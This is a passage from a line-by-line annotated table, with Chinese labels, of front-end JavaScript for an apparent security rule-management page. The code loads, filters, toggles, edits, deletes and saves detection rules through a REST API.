| 274 | 注释：说明前端逻辑或交互意图。 | `   * 加载` |
| 275 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 276 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  async function loadList() {` |
| 277 | 页面更新：修改元素内容、样式或状态。 | `    el.tbody.innerHTML =` |
| 278 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<tr><td colspan="10" class="alert-list__empty"><span class="loader"></span><span style="margin-left: 8px">加载中…</span></td></tr>';` |
| 279 | 页面更新：修改元素内容、样式或状态。 | `    el.listStatus.textContent = "";` |
| 280 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const query = {};` |
| 281 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (state.type) query.type = state.type;` |
| 282 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (state.enabled !== "") query.enabled = state.enabled;` |
| 283 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (state.q) query.q = state.q;` |
| 284 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    try {` |
| 285 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const items = await fetchApi("/api/rules", { query });` |
| 286 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `      (items \|\| []).forEach((r) => state.cache.set(r.id, r));` |
| 287 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      renderTable(items);` |
| 288 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      renderCounts(items);` |
| 289 | 页面更新：修改元素内容、样式或状态。 | `      el.listStatus.textContent = items.length` |
| 290 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        ? \`共 ${items.length} 条\`` |
| 291 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        : "";` |
| 292 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } catch (err) {` |
| 293 | 页面更新：修改元素内容、样式或状态。 | `      el.tbody.innerHTML =` |
| 294 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        '<tr><td colspan="10" class="alert-list__empty">' +` |
| 295 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        escapeHtml("拉取失败：" + (err.message \|\| "")) +` |
| 296 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        "</td></tr>";` |
| 297 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 298 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 299 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 300 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 301 | 注释：说明前端逻辑或交互意图。 | `   * 筛选交互` |
| 302 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 303 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function bindFilters() {` |
| 304 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.btnTypeGroup.forEach((btn) => {` |
| 305 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `      btn.addEventListener("click", () => {` |
| 306 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        state.type = btn.dataset.type \|\| "";` |
| 307 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `        el.btnTypeGroup.forEach((b) =>` |
| 308 | 页面更新：修改元素内容、样式或状态。 | `          b.classList.toggle("is-active", b === btn)` |
| 309 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        );` |
| 310 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        applyFilters();` |
| 311 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      });` |
| 312 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 313 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 314 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.selEnabled.addEventListener("change", () => {` |
| 315 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      state.enabled = el.selEnabled.value;` |
| 316 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      applyFilters();` |
| 317 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 318 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 319 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const onSearch = debounce(() => {` |
| 320 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      state.q = el.inputQ.value.trim();` |
| 321 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      applyFilters();` |
| 322 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }, 250);` |
| 323 | 事件绑定：监听用户操作并触发对应处理函数。 | `    el.inputQ.addEventListener("input", onSearch);` |
| 324 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 325 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.btnRefresh.addEventListener("click", () => {` |
| 326 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      applyFilters();` |
| 327 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      refreshGlobalCounts();` |
| 328 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 329 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 330 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.activeChips.addEventListener("click", (e) => {` |
| 331 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const btn = e.target.closest("[data-clear]");` |
| 332 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (!btn) return;` |
| 333 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const key = btn.dataset.clear;` |
| 334 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (key === "type") {` |
| 335 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        state.type = "";` |
| 336 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `        el.btnTypeGroup.forEach((b) =>` |
| 337 | 页面更新：修改元素内容、样式或状态。 | `          b.classList.toggle("is-active", !b.dataset.type)` |
| 338 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        );` |
| 339 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      } else if (key === "enabled") {` |
| 340 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        state.enabled = "";` |
| 341 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        el.selEnabled.value = "";` |
| 342 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      } else if (key === "q") {` |
| 343 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        state.q = "";` |
| 344 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        el.inputQ.value = "";` |
| 345 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 346 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      applyFilters();` |
| 347 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 348 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 349 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 350 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function applyFilters() {` |
| 351 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    renderChips();` |
| 352 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    loadList();` |
| 353 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 354 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 355 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 356 | 注释：说明前端逻辑或交互意图。 | `   * 表格行交互（开关 / 编辑 / 删除 / 测试）` |
| 357 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 358 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function bindTableHandlers() {` |
| 359 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.tbody.addEventListener("change", async (e) => {` |
| 360 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const input = e.target.closest('input[data-action="toggle"]');` |
| 361 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (!input) return;` |
| 362 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const tr = input.closest("tr");` |
| 363 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const id = tr && tr.dataset.id;` |
| 364 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (!id) return;` |
| 365 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const desired = input.checked;` |
| 366 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      input.disabled = true;` |
| 367 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      try {` |
| 368 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `        const updated = await fetchApi(` |
| 369 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          "/api/rules/" + encodeURIComponent(id) + "/toggle",` |
| 370 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          {` |
| 371 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            method: "PATCH",` |
| 372 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            body: { enabled: desired },` |
| 373 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          }` |
| 374 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        );` |
| 375 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        state.cache.set(updated.id, updated);` |
| 376 | 页面更新：修改元素内容、样式或状态。 | `        tr.classList.toggle("table__row--disabled", !updated.enabled);` |
| 377 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        toast(` |
| 378 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          updated.enabled ? "已启用：" + updated.name : "已禁用：" + updated.name,` |
| 379 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          "info"` |
| 380 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        );` |
| 381 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        refreshGlobalCounts();` |
| 382 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      } catch (err) {` |
| 383 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        input.checked = !desired;` |
| 384 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        toast("切换失败：" + (err.message \|\| ""), "error");` |
| 385 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      } finally {` |
| 386 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        input.disabled = false;` |
| 387 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 388 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 389 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 390 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.tbody.addEventListener("click", (e) => {` |
| 391 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const btn = e.target.closest("button[data-action]");` |
| 392 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (!btn) return;` |
| 393 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const tr = btn.closest("tr");` |
| 394 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const id = tr && tr.dataset.id;` |
| 395 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (!id) return;` |
| 396 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const action = btn.dataset.action;` |
| 397 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (action === "edit") {` |
| 398 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        openDrawer(id);` |
| 399 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      } else if (action === "test") {` |
| 400 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        openDrawer(id, { focusTest: true });` |
| 401 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      } else if (action === "delete") {` |
| 402 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        deleteRule(id);` |
| 403 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 404 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 405 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 406 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 407 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  async function deleteRule(id) {` |
| 408 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const rule = state.cache.get(id);` |
| 409 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const name = rule ? rule.name : id;` |
| 410 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!window.confirm("确认删除规则「" + name + "」？该操作不可撤销。")) {` |
| 411 | 返回结果：把计算值交给调用方。 | `      return;` |
| 412 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 413 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    try {` |
| 414 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      await fetchApi("/api/rules/" + encodeURIComponent(id), {` |
| 415 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        method: "DELETE",` |
| 416 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      });` |
| 417 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      state.cache.delete(id);` |
| 418 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      toast("已删除：" + name, "info");` |
| 419 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      applyFilters();` |
| 420 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      refreshGlobalCounts();` |
| 421 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } catch (err) {` |
| 422 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      toast("删除失败：" + (err.message \|\| ""), "error");` |
| 423 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 424 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 425 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 426 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 427 | 注释：说明前端逻辑或交互意图。 | `   * 抽屉：新建 / 编辑` |
| 428 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 429 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function openDrawer(id, { focusTest = false } = {}) {` |
| 430 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    state.editingId = id \|\| null;` |
| 431 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    resetTerminal();` |
| 432 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (id) {` |
| 433 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const cached = state.cache.get(id);` |
| 434 | 页面更新：修改元素内容、样式或状态。 | `      el.drawerTitle.textContent = "编辑规则：" + (cached ? cached.name : id);` |
| 435 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      el.btnDelete.hidden = false;` |
| 436 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (cached) fillForm(cached);` |
| 437 | 注释：说明前端逻辑或交互意图。 | `      // 再异步取最新` |
| 438 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      fetchApi("/api/rules/" + encodeURIComponent(id))` |
| 439 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `        .then((full) => {` |
| 440 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          state.cache.set(id, full);` |
| 441 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          fillForm(full);` |
| 442 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        })` |
| 443 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `        .catch(() => {});` |
| 444 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } else {` |
| 445 | 页面更新：修改元素内容、样式或状态。 | `      el.drawerTitle.textContent = "新建规则";` |
| 446 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      el.btnDelete.hidden = true;` |
| 447 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      clearForm();` |
| 448 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 449 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    updatePatternHint();` |
| 450 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    showDrawer();` |
| 451 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (focusTest) {` |
| 452 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `      requestAnimationFrame(() => {` |
| 453 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        document` |
| 454 | DOM 查询：定位页面元素以便读取或更新。 | `          .getElementById("section-test")` |
| 455 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          .scrollIntoView({ behavior: "smooth", block: "start" });` |
| 456 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        el.tInput.focus();` |
| 457 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      });` |
| 458 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } else {` |
| 459 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `      requestAnimationFrame(() => el.fName.focus());` |
| 460 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 461 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 462 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 463 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function showDrawer() {` |
| 464 | 页面更新：修改元素内容、样式或状态。 | `    el.drawer.classList.add("is-open");` |
| 465 | 页面更新：修改元素内容、样式或状态。 | `    el.drawerOverlay.classList.add("is-open");` |
| 466 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.drawer.setAttribute("aria-hidden", "false");` |
| 467 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.drawerOverlay.setAttribute("aria-hidden", "false");` |
| 468 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 469 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 470 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function closeDrawer() {` |
| 471 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    state.editingId = null;` |
| 472 | 页面更新：修改元素内容、样式或状态。 | `    el.drawer.classList.remove("is-open");` |
| 473 | 页面更新：修改元素内容、样式或状态。 | `    el.drawerOverlay.classList.remove("is-open");` |
| 474 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.drawer.setAttribute("aria-hidden", "true");` |
| 475 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.drawerOverlay.setAttribute("aria-hidden", "true");` |
| 476 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 477 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 478 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function clearForm() {` |
| 479 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.fName.value = "";` |
| 480 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.fDescription.value = "";` |
| 481 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.fType.value = "signature";` |
| 482 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.fAction.value = "alert";` |
| 483 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.fLevel.value = "high";` |
| 484 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.fPriority.value = "100";` |
| 485 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.fPattern.value = "";` |
| 486 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.fEnabled.checked = true;` |
| 487 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    hideError(el.eName);` |
| 488 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    hideError(el.ePattern);` |
| 489 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 490 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 491 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function fillForm(r) {` |
| 492 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.fName.value = r.name \|\| "";` |
| 493 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.fDescription.value = r.description \|\| "";` |
| 494 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.fType.value = RULE_TYPES.includes(r.type) ? r.type : "signature";` |
| 495 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.fAction.value = RULE_ACTIONS.includes(r.action) ? r.action : "alert";` |
| 496 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.fLevel.value = RULE_LEVELS.includes(r.level) ? r.level : "high";` |
| 497 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.fPriority.value = Number.isInteger(r.priority) ? String(r.priority) : "100";` |
| 498 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.fPattern.value = r.pattern \|\| "";` |
| 499 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.fEnabled.checked = !!r.enabled;` |
| 500 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    hideError(el.eName);` |
| 501 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    hideError(el.ePattern);` |
| 502 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 503 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 504 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function showError(node, msg) {` |
| 505 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!node) return;` |
| 506 | 页面更新：修改元素内容、样式或状态。 | `    node.textContent = msg;` |
| 507 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    node.hidden = false;` |
| 508 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 509 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 510 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function hideError(node) {` |
| 511 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!node) return;` |
| 512 | 页面更新：修改元素内容、样式或状态。 | `    node.textContent = "";` |
| 513 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    node.hidden = true;` |
| 514 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 515 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 516 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function updatePatternHint() {` |
| 517 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const hint = PATTERN_HINTS[el.fType.value] \|\| "";` |
| 518 | 页面更新：修改元素内容、样式或状态。 | `    el.fPatternHint.textContent = hint;` |
| 519 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 520 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 521 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function collectForm() {` |
| 522 | 返回结果：把计算值交给调用方。 | `    return {` |
| 523 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      name: el.fName.value.trim(),` |
| 524 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      description: el.fDescription.value.trim(),` |
| 525 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      type: el.fType.value,` |
| 526 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      action: el.fAction.value,` |
| 527 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      level: el.fLevel.value,` |
| 528 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      priority: Math.max(1, Math.min(999, parseInt(el.fPriority.value, 10) \|\| 100)),` |
| 529 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      pattern: el.fPattern.value,` |
| 530 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      enabled: el.fEnabled.checked,` |
| 531 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    };` |
| 532 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 533 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 534 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function validateFormClientSide(payload) {` |
| 535 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    hideError(el.eName);` |
| 536 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    hideError(el.ePattern);` |
| 537 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!payload.name) {` |
| 538 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      showError(el.eName, "规则名称必填");` |
| 539 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      el.fName.focus();` |
| 540 | 返回结果：把计算值交给调用方。 | `      return false;` |
| 541 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 542 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!payload.pattern.trim()) {` |
| 543 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      showError(el.ePattern, "特征 / 表达式必填");` |
| 544 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      el.fPattern.focus();` |
| 545 | 返回结果：把计算值交给调用方。 | `      return false;` |
| 546 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 547 | 返回结果：把计算值交给调用方。 | `    return true;` |
| 548 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 549 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 550 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  async function saveRule() {` |
| 551 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const payload = collectForm();` |
| 552 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!validateFormClientSide(payload)) return;` |
| 553 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.btnSave.disabled = true;` |
| 554 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    try {` |
| 555 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      let saved;` |
| 556 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (state.editingId) {` |
| 557 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        saved = await fetchApi(` |
| 558 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          "/api/rules/" + encodeURIComponent(state.editingId),` |
| 559 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          { method: "PUT", body: payload }` |
| 560 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        );` |
| 561 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      } else {` |
| 562 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        saved = await fetchApi("/api/rules", {` |
| 563 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          method: "POST",` |
| 564 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          body: payload,` |
| 565 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        });` |
| 566 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 567 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      state.cache.set(saved.id, saved);` |
| 568 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      toast(state.editingId ? "已更新：" + saved.name : "已创建：" + saved.name, "info");` |
| 569 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      state.editingId = saved.id;` |
| 570 | 页面更新：修改元素内容、样式或状态。 | `      el.drawerTitle.textContent = "编辑规则：" + saved.name;` |
| 571 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      el.btnDelete.hidden = false;` |
| 572 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      applyFilters();` |
| 573 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      refreshGlobalCounts();` |
| 574 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } catch (err) {` |
| 575 | 注释：说明前端逻辑或交互意图。 | `      // 尝试把后端错误挂到最相关字段` |
| 576 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const msg = err.message \|\| "保存失败";` |
| 577 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (/pattern\|threshold\|anomaly\|signature/i.test(msg)) {` |
| 578 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        showError(el.ePattern, msg);` |
| 579 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      } else if (/name/i.test(msg)) {` |
| 580 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        showError(el.eName, msg);` |
| 581 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      } else {` |
| 582 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        toast(msg, "error");` |
| 583 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 584 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } finally {` |
| 585 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      el.btnSave.disabled = false;` |
| 586 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 587 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 588 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 589 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function bindDrawerHandlers() {` |
| 590 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.btnNew.addEventListener("click", () => openDrawer(null));` |
| 591 | 事件绑定：监听用户操作并触发对应处理函数。 | `    el.drawerClose.addEventListener("click", closeDrawer);` |
| 592 | 事件绑定：监听用户操作并触发对应处理函数。 | `    el.drawerOverlay.addEventListener("click", closeDrawer);` |
| 593 | 事件绑定：监听用户操作并触发对应处理函数。 | `    el.btnCancel.addEventListener("click", closeDrawer);` |
| 594 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    document.addEventListener("keydown", (e) => {` |
| 595 | 页面更新：修改元素内容、样式或状态。 | `      if (e.key === "Escape" && el.drawer.classList.contains("is-open")) {` |
| 596 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        closeDrawer();` |
| 597 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 598 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 599 | 事件绑定：监听用户操作并触发对应处理函数。 | `    el.fType.addEventListener("change", updatePatternHint);` |
